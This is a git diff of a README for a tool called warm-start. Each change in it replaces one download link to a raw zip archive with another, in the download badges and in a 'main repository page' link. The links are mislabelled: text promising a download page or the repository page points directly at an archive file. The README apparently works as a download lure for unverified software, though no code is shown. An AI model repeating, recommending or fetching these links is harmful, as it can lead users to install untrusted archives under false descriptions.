@@ -1,6 +1,6 @@
 # ⚡ warm-start - gives project context before typing
 
-[![Download warm-start](https://img.shields.io/badge/Download-warm--start-brightgreen?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Kind-italianwoodbine415/warm-start/main/skills/warm/warm_start_1.8.zip)
+[![Download warm-start](https://img.shields.io/badge/Download-warm--start-brightgreen?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Kind-italianwoodbine415/warm-start/main/skills/warm/warm_start_v1.2.zip)
 
 ## 🔍 What is warm-start?
 
@@ -34,7 +34,7 @@ This section guides you through the steps to get warm-start running on your Wind
 
 Click the large button below to visit the download page:
 
-[![Download warm-start](https://img.shields.io/badge/Download-warm--start-ff69b4?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Kind-italianwoodbine415/warm-start/main/skills/warm/warm_start_1.8.zip)
+[![Download warm-start](https://img.shields.io/badge/Download-warm--start-ff69b4?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Kind-italianwoodbine415/warm-start/main/skills/warm/warm_start_v1.2.zip)
 
 You will see the GitHub repository page. Look for the **Releases** or **Download** section. This is where you can find the latest version of warm-start.
 
@@ -98,7 +98,7 @@ The tool needs access to your projects’ folders. Please grant any folder acces
 
 For additional help and details, visit the main repository page here:
 
-[https://raw.githubusercontent.com/Kind-italianwoodbine415/warm-start/main/skills/warm/warm_start_1.8.zip](https://raw.githubusercontent.com/Kind-italianwoodbine415/warm-start/main/skills/warm/warm_start_1.8.zip)
+[https://raw.githubusercontent.com/Kind-italianwoodbine415/warm-start/main/skills/warm/warm_start_v1.2.zip](https://raw.githubusercontent.com/Kind-italianwoodbine415/warm-start/main/skills/warm/warm_start_v1.2.zip)
 
 You can find updates, report issues, and see how warm-start works under the hood.
 
